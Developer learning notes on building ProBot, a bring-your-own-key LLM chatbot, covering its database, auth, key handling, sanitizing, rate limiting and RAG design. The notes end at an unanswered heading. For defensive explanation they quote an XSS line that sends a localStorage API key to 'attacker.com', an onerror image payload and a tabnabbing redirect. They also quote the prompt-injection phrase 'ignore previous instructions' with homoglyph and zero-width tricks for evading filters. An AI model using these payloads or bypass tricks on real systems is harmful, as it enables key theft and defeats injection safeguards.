# ProBot - Learnings

> Summary of my learnings while building this project from scratch and how I plan to incrementally build the product in stages.

## Overview

This document outlines a learning plan for building ProBot, an AI-powered chatbot platform. The plan is structured in stages, with each stage introducing new features and improvements while ensuring that the core functionality is available from the very beginning.

**Key Principle**: Learn by doing. The best way to understand how to build ProBot is to start building it, even if the initial version is very basic.

### 1. Drizzle ORM and PostgreSQL

> What is Drizzle and why use it?

Drizzle is a schema-first, type-safe SQL toolkit (not an ORM in the heavy ActiveRecord sense). Two layers:

- Schema layer (schema.ts): you declare pgTable("users", { id: uuid("id").primaryKey() ... }). This is not just types - it's a runtime metadata object Drizzle uses for both (a) generating SQL migrations (via drizzle-kit) and (b) building type-safe queries (via drizzle-orm).
- Query layer (index.ts): db.select().from(users).where(eq(users.email, "x")) - every column reference is type-checked against the schema. The return type of db.query.users.findFirst() is User | undefined inferred from the schema - no separate type declarations.

The $inferSelect / $inferInsert helpers expose those inferred types so other modules (NextAuth in Task 1.3, the chat API in Task 1.8) can import User without re-typing the schema.

The pg.Pool is a connection pool - it keeps a small set of TCP connections open to Postgres and hands them out per query, avoiding the cost of opening a new connection every request. In Next.js, the pool is created once per server instance (singleton in index.ts).

> How Drizzle's type inference works?

pgTable("users", { id: uuid("id").primaryKey().defaultRandom(), ... }) returns a runtime metadata object and a TypeScript type carrier. typeof users.$inferSelect extracts the row shape as it comes back from a SELECT (so id is string, createdAt is Date, optional columns are T | null). typeof users.$inferInsert extracts the insert shape (columns with defaults become optional - you don't have to provide id, createdAt, llmProvider, etc.). These types flow through every Drizzle query - db.query.users.findFirst() returns User | undefined without you writing a single type annotation. This is the same idea as Prisma but without code generation - pure inference.

Why the pg.Pool is lazy: new Pool({ connectionString: undefined }) does not error. The pool stores config and waits - it only opens its first TCP connection when pool.query() or pool.connect() is called. That lets import { db } from "@/lib/db" succeed at build time even with no DATABASE_URL set, and fail loudly only when the first real query runs. Compare to a strict pattern where the import itself would throw: that would break next build for any module that transitively imports db, even on a code path that doesn't actually query.

Why gen_random_uuid() works without pgcrypto: Postgres ≥ 13 ships gen_random_uuid() built-in. Supabase, Neon, and modern local installs all qualify. Drizzle's .defaultRandom() emits DEFAULT gen_random_uuid() in the migration SQL - no extension migration needed.

---

### JWT Authentication with NextAuth

> Why JWT for Stage 1, not DB sessions?

With NextAuth's Credentials provider, the only real choice is JWT - Credentials doesn't ship with a DB-sessions story (you'd have to roll your own session table + adapter). JWT means: at login, NextAuth signs a JSON Web Token containing the user id (and whatever else we put in it) using NEXTAUTH_SECRET. The token rides in an HTTP-only cookie. On every request, NextAuth verifies the signature without touching the DB - fast and stateless. The tradeoff: you can't revoke a JWT before it expires (sessions are bounded by the JWT's exp claim, default 30 days). For Stage 1 this is fine; Stage 7 can short-shorten the JWT TTL or add an in-memory blocklist if needed.

Why bcrypt and not Argon2? Argon2 is technically stronger, but bcrypt / bcryptjs is the standard for Node app auth and is what NextAuth examples use. Bcrypt's known-quantity threat model - slow comparison via cost factor, salt baked into the hash string - is sufficient. The cost factor controls how slow each hash is (each +1 doubles the time); 10 ≈ 100ms per hash, which is the right "fast for users, slow for attackers" balance.

Why does the username validation matter NOW even though the public URL isn't live? The users.username column has UNIQUE NOT NULL - every registered user has one stored. If we let Jane.Doe register today, then in Stage 4 we add a route app/u/[username]/chat/page.tsx and someone navigates to /u/Jane.Doe/chat, two problems: (1) URLs are case-sensitive on most CDNs - Jane.Doe ≠ jane.doe, (2) the . could collide with a reserved Next.js route segment. Enforcing the regex at the gate is the easiest fix.

---

### Route Groups

> Why a route-group layout?

src/app/(auth)/layout.tsx is rendered for both /login and /register but not for /, /dashboard, etc. The parens make (auth) a route group - purely organizational, never appears in the URL. So the shared chrome (left brand panel, container, fonts) renders once and only the page content swaps as you navigate between /login and /register. Faster transitions, less duplicated JSX, and the URL stays clean.

Why next/font/google over CDN? With CDN, the browser does: (1) parse HTML, (2) discover <link>, (3) DNS-lookup + connect to fonts.googleapis.com, (4) fetch CSS, (5) discover font URL, (6) DNS-lookup + connect to fonts.gstatic.com, (7) fetch WOFF2, (8) finally render text. With next/font/google, Next downloads the fonts at build time, hashes them, serves them from your own origin, and inlines @font-face declarations into your CSS - text renders on first paint with no FOUC. Bonus: GDPR-friendly (no third-party hit), and it works in offline / restricted-network deployments.

Why auto-sign-in after register? Two separate round-trips would force users to type their password twice (once to register, once to log in). The POST /api/auth/register returns 201 with the user, then the client calls signIn('credentials', ...) with the same email/password - the user goes register → dashboard in one motion. Per srs.md §5.1.1's CTA "Create Your Bot in 2 Minutes," friction here is a goal-state.

---

### Multi-Provider LLM Adapters (BYO-Key)

> Why does each `complete()` call construct a brand-new SDK client instead of caching one?

A normal single-tenant app does `const client = new Anthropic({ apiKey: process.env.ANTHROPIC_API_KEY })` once at module load - the client object holds the key plus a configured `fetch` wrapper, and you reuse it for every request. ProBot can't. This is a **BYO-key** product: request A from user Jane carries Jane's Anthropic key in the `x-llm-api-key` header; request B one millisecond later from user Bob carries Bob's. There is no single "the" key. A cached singleton would either pin to one user's key forever (wrong) or require mutating a shared object's auth state between requests (race-condition heaven - request A could send Jane's prompt with Bob's key if the mutation interleaves with the in-flight HTTPS call). The fix is dead simple: construct a fresh `new Anthropic({ apiKey })` per request. SDK construction is cheap - the constructor just stores the key in a private field and prepares a `fetch` wrapper; it does **not** open any network connection. The HTTPS request happens later, on `client.messages.create()`. So "per-request client" really means "per-request 50-byte object that closes over the right key" - zero performance cost, total isolation.

> Why does `import Anthropic from "@anthropic-ai/sdk"` then `Anthropic.APIError` blow up under Vitest mocks, while `import Anthropic, { APIError } from "@anthropic-ai/sdk"` survives?

The Anthropic SDK exports both a default (the `Anthropic` class) and named siblings (`APIError`, `AuthenticationError`, `RateLimitError`, …). For convenience, the SDK also attaches the error classes as **static properties** on the class - so `Anthropic.APIError === APIError` at runtime in production. In tests, the typical Vitest mock looks like `vi.mock("@anthropic-ai/sdk", async () => ({ ...await vi.importActual(...), default: MockClass }))`. This spreads all the named exports (`APIError`, etc.) but replaces `default` with `MockClass`. Production code that says `err instanceof Anthropic.APIError` now resolves to `err instanceof MockClass.APIError` - and `MockClass.APIError` is **undefined**, because the mock class is a hand-rolled stub that doesn't carry the SDK's statics. `instanceof undefined` throws `TypeError: Right-hand side of 'instanceof' is not an object`, and your error-mapping path silently dies. The fix is to import `APIError` as a **named** import (not via the class's static): `import Anthropic, { APIError } from "@anthropic-ai/sdk"` then `err instanceof APIError`. Named imports resolve straight from the module's exports object, which the mock preserves verbatim. Lesson generalizes to any SDK that exposes errors both as named exports and as statics: always reach for the named export - it's resilient against mock shenanigans and it's also one less indirection at runtime.

> Why bound `ProviderError`'s serialized shape with a `toJSON()` override?

`JSON.stringify(errorInstance)` by default walks the object's own enumerable properties - which includes anything else stuck on the error, including a `cause` field (built into modern `Error`) and any custom fields the caller might tack on later. In a BYO-key system this is a leak waiting to happen: imagine a future contributor catches a `ProviderError`, wraps it with `new Error("chat failed", { cause: originalSdkError })`, and a Sentry breadcrumb calls `JSON.stringify(err)`. The original SDK error's `.headers` property - which contains `Authorization: Bearer sk-ant-XXX` - gets serialized into telemetry. Defining `toJSON() { return { name, provider, category, message }; }` bounds the serialized shape to exactly those four fields no matter what callers attach. `JSON.stringify` always honors `toJSON`, so even nested `{ outer: providerError }` gets flattened to the safe shape. The cost is 6 lines of code; the win is that "the key cannot accidentally enter the structured log pipeline" stops being a discipline question (which fails) and becomes a code-enforced invariant (which doesn't).

---

### BYO-Key in the Browser: Per-Origin localStorage as the System of Record

> Why is the user's LLM API key safe in browser `localStorage`, and what would make it NOT safe?

`localStorage` is per-origin (scheme + host + port) and not sent automatically with any request - unlike cookies, which the browser auto-attaches to every request to the origin. That property is what makes `localStorage` correct for a BYO-key value: the key only travels somewhere when _our code explicitly reads it and puts it in a header_. The two ways it could still leak are (a) cross-site scripting (XSS) - if any code on the same origin can run `document.write(<script>fetch("attacker.com?k="+localStorage.getItem("probot.llm.key.v1"))</script>)`, it can exfiltrate the key, which is why every input rendered as HTML (chat replies, bot bios) must NOT use `dangerouslySetInnerHTML` and must go through a sanitizer like react-markdown's default escaping, and (b) shared computers / browser extensions - anything with read access to `localStorage` on the user's machine can see the key. That second one is a fundamental tradeoff of "we never store the key on our server": the convenience of "your key never leaves your device" comes with "anyone with access to your device sees your key." We mitigate (a) with strict CSP + no `dangerouslySetInnerHTML` + react-markdown's escaping; we accept (b) as the cost of zero-trust BYO-key. The alternative - passing the key through ProBot servers - would shift the trust boundary from "the user's device" to "every ProBot deployment", which is exactly what the product is built to avoid.

> Why is the BYO key sent in an HTTP header (`x-llm-api-key`) instead of the JSON body?

Two reasons, both about _accidental_ leaks. (1) Server frameworks routinely log request bodies - Sentry breadcrumbs, structured loggers, Vercel's `console.log` capture, even Next.js's own dev-server output sometimes echoes bodies on errors. They almost never log custom request headers by default. Putting the key in a header instead of the body means a careless `console.log(req.body)` somewhere downstream can't leak it. (2) The browser's network inspector treats headers and bodies differently in some integrations (e.g. some analytics tools record body snippets for failed XHR but not headers). The header form puts the key in the smaller, less-touched part of the request. This is defense-in-depth - neither logging nor analytics integration is supposed to record secrets, but the header convention reduces the surface where "supposed to" matters. The chat UI test asserts both halves of this explicitly: `headers["x-llm-api-key"]` equals the key, AND `init.body` (the raw stringified body) does **not** contain the key value as a substring.

---

### React List Reconciliation: Synthetic IDs vs Array Indices

> Why does using `messages.map((m, i) => <Bubble key={i} />)` work fine until it suddenly breaks?

React uses the `key` prop to figure out, between renders, which children are the "same" element so it can preserve DOM, focus, and component state. When `key={i}` (the array index), React thinks index 0 is always "the same element" - even if you've replaced what's at index 0 with a different message. As long as messages are only ever _appended_ to the end, this happens to work: the new last item gets a fresh index, no existing index changes, no reconciliation surprises. The moment any operation _mutates a slot_ - replacing an optimistic "user message sent" bubble with the actual error retry, splicing a deleted message out of the middle, reordering for relevance - React reuses the wrong DOM nodes. You see things like focus jumping to the wrong textbox, animations playing on the wrong bubble, or - most insidiously - a `useState` inside a bubble component carrying over from a different message and showing stale data. Synthetic IDs (one per insertion, e.g. `crypto.randomUUID()`) fix this because two distinct messages, even at the same array position, get different `key` values; React knows to unmount the old one and mount the new one. The cost is six characters of memory per message. The cost of NOT having them is a class of bugs that only show up when you start mutating mid-list, which is exactly when you stop being able to debug them quickly.

> When IS using the array index as `key` actually fine?

When the list is **truly immutable** in shape - never reordered, never has items spliced out, never has items replaced in place. A nav menu rendered from a hardcoded `const ITEMS = [...]` is fine. A read-only paginated table where each page is a fresh array (no in-place mutation) is fine. Anywhere else, default to synthetic IDs from the moment you create the data, not the moment you render it - generating IDs at render time is also wrong (every render produces new IDs, defeating the point).

---

### Markdown Safety: react-markdown's Default Behavior

> Why doesn't `<ReactMarkdown>{userInput}</ReactMarkdown>` render an `<img onerror="alert(1)">` when the input contains exactly that?

react-markdown parses input as **Markdown** (CommonMark + plugins), not HTML. The parser does not recognize raw HTML elements like `<img>` or `<script>` as renderable tags - by default, anything that looks like an HTML tag is either passed through as escaped text (`&lt;img …&gt;`) or stripped, depending on the plugin chain. So an attacker-supplied `<img src=x onerror=alert(1)>` ends up as the literal string in a `<p>`, not as an active `<img>` element. The DOM never sees an `img` node, so the `onerror` handler never fires. This is fundamentally different from `dangerouslySetInnerHTML={{__html: userInput}}`, which hands the string directly to the browser's HTML parser and runs anything it finds. The protection holds **as long as you don't add `rehype-raw`** - `rehype-raw` opts into rendering raw HTML and immediately re-introduces the XSS path you got rid of. The test that asserts `document.querySelector("img")` returns `null` is what locks this in: any future contributor who adds `rehype-raw` to "get HTML support back" will break that test and have to make a conscious decision instead of an accident.

> Why force every `<a>` through a `SafeLink` component with `rel="noopener noreferrer" target="_blank"`?

`target="_blank"` makes the link open in a new tab - good UX for an AI-generated response that links elsewhere. But `target="_blank"` without `rel="noopener"` creates the **"reverse tabnabbing" vulnerability**: the newly opened page gets a `window.opener` reference back to _your_ page, and can do `window.opener.location = "https://phishing-site.example/"` to silently redirect the user's original ProBot tab to a phishing site that looks like ProBot. `rel="noopener"` severs the `window.opener` link so the new tab cannot reach back. `rel="noreferrer"` additionally strips the `Referer` header so the destination doesn't see what page sent the user. Together they are the modern-browser equivalent of "yes, open in a new tab, but with no strings attached." Passing a custom `components={{ a: SafeLink }}` map to ReactMarkdown is the cleanest way to enforce this on **every** link the markdown renderer produces, including ones from future bot output we haven't seen yet - the safety becomes a property of the renderer, not of any individual call site.

---

### Unicode Normalization as Bypass Defense

> Why normalize before pattern-matching? Doesn't a regex like `/ignore previous/i` already handle case?

Case-folding is one of many ways to spell the same thing. The interesting ones are visual: an attacker can write `ignоre previous` where the `о` is **Cyrillic** `U+043E`, not Latin `U+006F`. Both render as a circle, but to a regex they're completely different code points - `/ignore/i` will not match `ignоre`. Same story with fullwidth ASCII (`ｉｇｎｏｒｅ` is U+FF49 U+FF47 …), zero-width insertions (`i​gnore`), Arabic-Indic digits that look like Latin, and ~hundreds of other homoglyph attacks. The defense is the same shape every time: **run a normalization pass first, then pattern-match against the normalized output.** For ProBot the pipeline is: strip zero-width chars → map fullwidth ASCII back to ASCII (`String.fromCharCode(ch - 0xfee0)`) → replace a small whitelist of Cyrillic homoglyphs (`аеорсуіѕ → aeopcyis`) → collapse whitespace. The blocked-pattern array only sees normalized input. Tests verify both that `ignоre previous` and `ｉｇｎｏｒｅ previous instructions` get blocked - proving normalization runs before the scan and that the scan can't be bypassed by typing tricks. The Cyrillic map is intentionally a hand-picked whitelist, not a full Unicode "confusables" table - over-stripping is its own attack surface (you can imagine a legitimate name like "Соня" getting its Cyrillic letters mangled). Stick to the letters that have one obvious Latin equivalent and that attackers actually use in published bypass corpora.

> Why is length-checking AFTER normalization, not before?

Imagine an attacker sends 100,000 zero-width characters followed by `ignore previous`. A pre-normalization length check (`raw.length > 8000`) rejects with "too_long" - a hint that something about the size mattered. A post-normalization check sees a 16-character string and either rejects as "blocked" (because the prefix is empty after stripping zero-widths) or accepts as a normal short message. Putting normalization first means the length cap reflects what the model will actually see, and prevents zero-width-stuffing from being a distinct probe-able rejection class. The tradeoff: you do `O(n)` normalization work on inputs that might end up being rejected as too_long anyway. For 8 KB max payloads this is negligible.

---

### Sliding-Window Rate Limiting via Timestamp Arrays

> Why a sliding window instead of a fixed window? And why timestamp arrays instead of a counter?

A **fixed window** ("10 requests per minute") quantizes time: 9 requests at 12:00:59 plus 10 requests at 12:01:00 means 19 requests in 1 second technically passes "10 per minute" twice over. A sliding window enforces the policy continuously: at any instant, "the last 60 seconds" contains at most 10. The data structure that makes this trivial is a per-key array of request timestamps: on each check, drop entries older than `now - windowMs`, then test `array.length >= cap`. If under, append `now` and allow. The array length IS the live count - no separate counter to maintain or get wrong. For 10/min the array is at most 10 entries per bot; for 50/day, at most 50. Memory is `O(cap)` per active bot, not `O(total requests)`. Storage cost is tiny enough that the Node process can hold thousands of bots in RAM before any pressure shows up - and Vercel cold-starts naturally bound it anyway.

> Why does the two-tier (per-minute AND per-day) need a rollback step?

Both buckets see the same `now` timestamp on every request. If we check per-minute first and it passes, we append the timestamp to the minute bucket. Then we check per-day, and if THAT one fails, we've already consumed a per-minute slot for a request we ultimately rejected. Next minute, the user has 9 slots instead of 10 - they were silently charged for the rejected request. The fix is to roll back the per-minute slot when per-day rejects: `if (minuteStamps.at(-1) === now) minuteBuckets.set(botId, minuteStamps.slice(0, -1))`. The `.at(-1) === now` guard is important - if a concurrent request in the same millisecond also appended, popping the wrong entry would corrupt the other request's accounting. The immutable `slice(0, -1)` produces a fresh array (no shared mutation hazard); the in-place `.pop()` would have been a CLAUDE.md §2 violation and a real concurrent-write footgun if Node's microtask queue ever interleaves the two `set()` calls.

> When does in-memory rate limiting break down, and why is it still the right call for Stage 1?

In-memory state lives in a single process. On Vercel serverless, each function instance has its own memory; instance A's 10 slots and instance B's 10 slots together allow 20 per minute across the fleet. On a self-hosted long-running Node process there's one global counter that works correctly until you horizontally scale to multiple instances. Both modes are wrong for production traffic, and Stage 7 swaps the whole module for Upstash Redis (which gives a globally consistent counter). For Stage 1 the math is: one bot owner testing their own bot from one IP at a time, ~10 messages a minute is generous. Shipping Redis on day one would mean: a paid service, an env var, a `redis:` dependency in the test surface, and one more network hop per request - all to defend against a usage pattern that doesn't exist yet. The right move is the cheap correct-enough version with a known swap path (the call shape `checkRateLimit(botId): { ok, scope?, resetAt? }` doesn't change when Redis lands behind it).

---

### Token-Based Chunking with Overlapping Windows

> Why does `chunkText` walk the token array with a stride of `target - overlap` instead of just splitting on sentence boundaries?

Sentence-boundary splitting (split on `. ` or `\n\n`) feels intuitive but breaks the moment your input doesn't have those signals: a resume with bullet points, a PDF whose extractor concatenated lines without punctuation, a foreign-language transcript with different sentence terminators. Token-based chunking with a fixed budget side-steps all of that: the encoder gives you a sequence of integers, you take windows of `targetTokens` length, you decode each window back to text. The overlap exists because semantic information lives across boundaries - if the sentence "Jane led the migration to Kubernetes" gets cut between chunks at the word "Kubernetes," chunk N has "Jane led the migration to" and chunk N+1 has "Kubernetes," and an embedding (Stage 3) of either alone misses the connection. Overlapping by 100 tokens means both chunks contain the full phrase. Concretely: `targetTokens=750`, `overlapTokens=100`, `stride=650`. Chunk 0 covers tokens [0, 750), chunk 1 covers [650, 1400), chunk 2 covers [1300, 2050), and so on. Each consecutive pair shares 100 tokens of content. The stride is what governs how many chunks you produce: a 5,000-token document yields `ceil((5000 - 750) / 650) + 1 ≈ 8 chunks`. The overlap is what governs how robust your downstream embedding/retrieval will be. In Stage 2 we pay the redundancy cost (~13% extra text in `context_text` after assembly) and the cap absorbs it; in Stage 3 the overlap becomes the whole point - each chunk's vector embedding captures both its center _and_ the contextual neighbors, which is what lets cosine-similarity search find "the paragraph about K8s" even when the user's query embeds nearer the word "containers" than to "Kubernetes."

> Why `cl100k_base` instead of a model-specific encoder?

`cl100k_base` is OpenAI's BPE encoder used by `gpt-4` / `gpt-4o` / `gpt-3.5-turbo`. Token counts are exact for those models. For Anthropic, Gemini, and DeepSeek the count is approximate (within ~10-15% in practice, more for non-English text). We accept that error because the per-bot `contextTokenCap` is itself a heuristic ceiling we picked, not a hard limit the provider enforces: when a user sets 12,000 tokens, the chat route still leaves room for their question + the system prompt + the response, so a ~10% miscounting cushion is already baked in. The alternative ("each provider has its own tokenizer, use the right one per user") would cost a per-provider import, a runtime branch on `bot.llmProvider`, and a much larger WASM footprint - all for a difference that gets absorbed by the conservative cap defaults. Stage 3's vector embedding pipeline will use a provider-matched embedder for similarity quality, but the chunking step itself can stay encoder-agnostic.

---

### When PDF Library Workarounds Become a Class of Problem

> Why is `pdf-parse` imported as `import("pdf-parse/lib/pdf-parse.js")` instead of `import pdfParse from "pdf-parse"`?

`pdf-parse@1.1.1` has a long-known bug where the package root entrypoint (the file `package.json`'s `"main"` points to) runs **demo code at module-load time**. It reads a bundled test PDF (`./test/data/05-versions-space.pdf`) and prints its text - originally meant as a "this is how you use the library" smoke test. Two problems with this: (1) under Next.js bundling, the demo code runs at build time, looking for a file that doesn't exist in the build's working directory, and crashes the build. (2) Even at runtime, you're paying for a PDF parse you never asked for just by importing the lib. The widely-documented workaround is to bypass the package root and import the actual implementation file: `pdf-parse/lib/pdf-parse.js`. Combined with a dynamic `import()` inside the function (instead of a top-level static import), you also delay loading until the first PDF arrives - cold-start cost is paid by the first uploading user, not by every cold container that boots. This is a pattern worth recognizing: many Node libs that predate the ESM era have side effects at import time, and Next.js's Webpack-based bundling is uniquely intolerant of them. When you see `Module not found: Can't resolve 'fs'` or `ENOENT: ./test/data/something.pdf` in a Next.js build log and the lib in question is a Node-classic CommonJS package, look for a `/lib/` subpath that contains just the implementation.

> Why did `BotFactoryForm` importing `MAX_PDF_BYTES` from `extract-pdf.ts` break the production build?

`BotFactoryForm.tsx` starts with `"use client"`. Anything it imports becomes part of the client bundle that the browser downloads and runs. `extract-pdf.ts` lives on the server, but it has `import("pdf-parse/lib/pdf-parse.js")` inside one of its functions. Webpack's static analysis - even though that import is dynamic and gated behind a conditional - treats the entire dependency graph reachable from the file as potentially needed in the bundle the importing module ships. So when the client file imports any export from `extract-pdf.ts`, Webpack pulls `pdf-parse` into the client graph, which depends on `fs` (a Node-only module that doesn't exist in the browser), and the build fails with `Module not found: Can't resolve 'fs'`. The fix is structural, not a config flag: split the file so that the client-safe surface (constants) lives in a module that imports nothing from Node-only deps, and the server-only surface (the actual extractor that uses `pdf-parse`) lives in a separate file that re-imports those constants. This is why `src/lib/ingestion/constants.ts` exists. **The general rule for a Next.js codebase: any module reachable from a `"use client"` file must have a zero-Node-deps closure**. When you find yourself wanting to share a single constant or type between server and client, ask: is the file that owns it currently importing anything server-only? If yes, move just the shared thing into a dependency-free module first.

---

### Discriminated Unions for "Maybe Did the Auth Check Fail" Returns

> Why does `requireBotOwner` return `{ ok: true, bot, userId } | { ok: false, response }` instead of throwing on auth failure?

Three patterns are common for "this function might fail an auth check":

1. Throw a typed error and let the caller try/catch (`requireBotOwner(botId)` → throws `UnauthorizedError | ForbiddenError | NotFoundError`).
2. Return `null` on failure and let the caller fabricate the response (`requireBotOwner(botId): Bot | null`).
3. Return a discriminated union with the prebuilt response on failure (the pattern shipped here).

Pattern (1) forces every route to wrap calls in try/catch and re-author the response, and gives the type system zero help making sure they did. Pattern (2) is concise at the call site but loses information: was it 401 (no session) or 403 (wrong owner) or 404 (no such bot)? The caller has to re-check to pick a status code, which means re-running the same checks. Pattern (3) hands back a fully-formed `NextResponse` for the failure cases, so each route's auth handling collapses to one line: `if (!owner.ok) return owner.response;`. The discriminator (`ok`) is a value the compiler narrows on - inside `if (owner.ok) { ... }`, TypeScript knows `bot` and `userId` are defined; in the `else`, it knows `response` is defined. There's no place to forget the auth check because there's no place to access `bot` without first proving `ok` is true. The pattern scales: if Stage 3 needs a `requireBotOwnerWithKnowledge` (verify owner AND at least one chunk exists), it returns the same discriminator shape with extra fields on the success arm, and every route that uses it gets compile-time enforcement that they handle both arms. **The point of discriminated unions in domain code isn't elegance, it's making the type system enforce control flow that comments can only ask for.**

---

### Per-Source Replace Semantics for Idempotent Re-Uploads

> Why does the POST `/knowledge` route do `deleteSource(botId, sourceName)` _before_ inserting new chunks, instead of upserting or appending?

When a user re-uploads `resume.pdf` after editing it, they expect the new version to **replace** the old one - not to coexist with stale chunks from the previous upload. The semantic they want is "this source name is the latest version of itself." Three implementations:

1. **Append-only:** Insert new chunks alongside the old. Now you have ghost chunks from the old version polluting the context. The user has to remember to manually DELETE the old source first. Awful UX.
2. **Upsert by `(bot_id, source_name, chunk_index)`:** Overwrite chunks at the same index. Breaks the moment the new version chunks to a different count - chunks 0-4 get overwritten but chunks 5-9 from the old version remain orphaned.
3. **Per-source replace:** Delete every row matching `(bot_id, source_name)`, then insert the new chunks. Atomic at the source level, no orphans, no ghost content. The implementation: `deleteSource(botId, "resume.pdf")` → bulk insert N new chunks.

The cost is that the operation isn't strictly idempotent at the chunk level - chunk row IDs change on every re-upload - but it _is_ idempotent at the user-facing semantic level: uploading the same PDF twice produces the same final state. This is also why the DELETE endpoint operates on a source name, not a chunk ID: the unit of "knowledge" the user manages is the source (a PDF, the manual text block), not the individual chunk inside it. The chunk is an implementation detail of how we feed the LLM. The same principle - **align the API's primitive with the user's mental model, not with the storage layout** - is why the per-bot token cap lives on `bots` not on a separate settings table: users think "my bot's max context," not "my user account's preference for bot max contexts."

---

### Never Echo What You Reject

> Why do `sanitizeInput`, `sanitizeOutput`, and `KeyTransportError` all return error/fallback strings that don't include the original input?

This is the same principle as Task 1.5's `ProviderError.toJSON()` - **the rejection path is a logging surface, and any log of the rejection that includes the rejected content turns "we blocked an attack" into "we wrote the attack to disk forever."** Imagine three real failure modes: (1) a user sanitizer error gets logged with `console.error("blocked input:", raw)` - now Sentry has the raw input, including any credential the user fat-fingered into the chat (`"hey what does sk-ant-XYZ123 mean?"`). (2) An output sanitizer rejection gets logged with the dirty reply - now the model's leak of `"Authorization: Bearer …"` is permanently in your error tracking, exactly what the sanitizer was preventing from reaching the client. (3) A bad-key `KeyTransportError` message says `"x-llm-api-key value 'sk-ant-XYZ' is too short"` - the key itself ends up in any breadcrumb that captures the error message. The fix is the same in all three places: the rejection returns a **fixed, content-free reason**. `{ ok: false, reason: "blocked" }`, never `{ ok: false, reason: "blocked: matched 'ignore previous'" }`. The trade-off is that debugging blocked requests gets harder - you can't read the log and see exactly what tripped which rule. The mitigation is a development-only debug mode (env-flagged) that includes the trigger; production deployments default to the silent-rejection shape. Tests lock this in by injecting a "canary" string into the input and asserting `JSON.stringify(result)` doesn't contain it - defensive against any future "let me add the input to the error for debugging" PR.

> Why does the route map `ProviderError.message` to fixed strings (`"invalid_llm_key"`, `"provider_rate_limit"`) instead of pass-through?

Same principle, one layer up. Even though Task 1.5 already enforces that `ProviderError.message` doesn't contain the API key, the route can't trust _every_ future error class the chain might throw. By translating to a fixed enum at the route boundary, the client never sees a string the route didn't author. The client gets `{ "error": "invalid_llm_key" }` regardless of whether Anthropic's SDK threw `"Invalid x-api-key header"` or OpenAI's threw `"Incorrect API key provided: sk-…"` (yes, OpenAI's error message historically included the rejected key). The status code matrix on the client side is a sealed enum - every code maps to a fixed UX (`invalid_llm_key` → "your key looks wrong"; `provider_rate_limit` → "your provider is throttling, slow down"; `provider_unavailable` → "something's down on their end, try again"). This is also why the route's `error` strings are snake_case identifiers, not human prose - they're for the UI's switch statement, not for direct display to users.

---

### Why RAG Beats Full-Context Injection (Stage 3)

> Why do we add semantic search at all? The Stage 2 bot was already answering correctly with `bots.context_text` injected into the prompt.

The Stage 2 architecture concatenates every chunk for a bot into one giant prose blob and shoves the whole thing into the system prompt on every chat call. For a small resume (~5 KB), that works fine. For someone who uploads their resume, LinkedIn export, three project READMEs, a portfolio dump, and a list of talks they've given - you're suddenly sending 30-50K tokens of context with every single question, most of which has nothing to do with what the recruiter asked. Three real costs stack up. First, **token cost** - the user is paying their LLM provider per input token, and 90% of those tokens are noise. Second, **context-window pressure** - models like Haiku and gpt-4o-mini have hard input limits in the 100-200K range, but their _effective_ attention degrades sharply past ~20K tokens (the "needle in a haystack" problem). The model literally answers worse when buried in irrelevant context. Third, **latency** - prompt processing time scales linearly with input length. RAG fixes all three by computing a vector embedding of the user's question, finding the 5 most semantically similar chunks from the bot's knowledge, and injecting ONLY those chunks. The prompt drops from 30K tokens to 1K, the model's attention is concentrated on the relevant facts, and the user pays for ~3% of what they were paying before. The cost is one extra API call per chat (the query embedding) plus one database query - usually under 100ms combined.

> What does "semantic similarity" actually mean here? How does the cosine distance figure out that "what languages does she know?" should retrieve the "Skills" section of the resume?

Embeddings translate a piece of text into a fixed-length array of numbers - in our case 1536 of them - such that texts about the same _meaning_ end up close together in the 1536-dimensional space, even if they share no words. The model behind `text-embedding-3-large` has been trained on hundreds of billions of text pairs ("query, document that answers it") so it learns that "programming languages" and "Python, TypeScript, Go" are neighbors, even though they share zero literal characters. **Cosine similarity** is the geometric measure of how close two vectors point in the same direction: it's the cosine of the angle between them. Identical direction = 1, perpendicular = 0, opposite = -1. The reason we use cosine over Euclidean distance is that OpenAI's embeddings are pre-normalized to unit length, so distance differences are entirely about _direction_ (the meaning) and not _magnitude_ (which is a per-vector artifact of the encoder). pgvector's `<=>` operator returns cosine _distance_ (1 - similarity), so `1 - (embedding <=> query)` recovers the similarity score we can threshold against - we drop anything below 0.5 because below that we're in coincidence territory rather than real relevance.

> What is "Matryoshka representation" and why did we pick `text-embedding-3-large` at 1536 dims instead of the natural 3072?

Matryoshka representation is a training technique OpenAI used for the `-3` series of embedding models where the model is taught to put the most important meaning information in the _first_ N dimensions of the output vector. The 3072-dim vector from `text-embedding-3-large` can be truncated to its first 1536 dims and still carry most of the semantic signal - per OpenAI's own MTEB benchmark, `large` at 3072d scores 64.6, `large` truncated to 1536d scores 63.3, and `small` at 1536d scores 62.3. So a Matryoshka-truncated `large` is still better than `small`, while using the same column width. We invoke this at the API level: `client.embeddings.create({ model: "text-embedding-3-large", dimensions: 1536, input })`. The win is halved pgvector storage and smaller HNSW indexes (the index size scales linearly with dimension count). The trade-off is a tiny accuracy loss (~1.3 MTEB points) vs `large` at full 3072d, which is invisible at the scale of resume Q&A.

> Why store a vector column on Postgres instead of using a dedicated vector database like Pinecone?

Two reasons - one technical, one constraint-driven. Technically, vector databases are specialized for two things: (1) datasets that don't fit in memory, and (2) extremely high query QPS. Neither applies here. Each user's bot has maybe 50-500 chunks; the entire vector index for the whole platform fits comfortably in Postgres's shared buffers. A pgvector HNSW index over 1M vectors on a Supabase free-tier instance returns top-5 in under 10ms - faster than the network round-trip to Pinecone. The constraint-driven reason is CLAUDE.md §7: zero-cost operations. Pinecone's free tier has hard caps (one index, eventual deprecation), Weaviate's free tier requires self-hosting, and Qdrant Cloud has similar restrictions. Supabase already includes pgvector on every plan including free. The architecture decision is: stay in Postgres until you provably need a dedicated system, because the operational overhead of running two databases (and synchronizing them) is bigger than any latency win at our scale.

> What does the HNSW index actually do? Why not a regular B-tree?

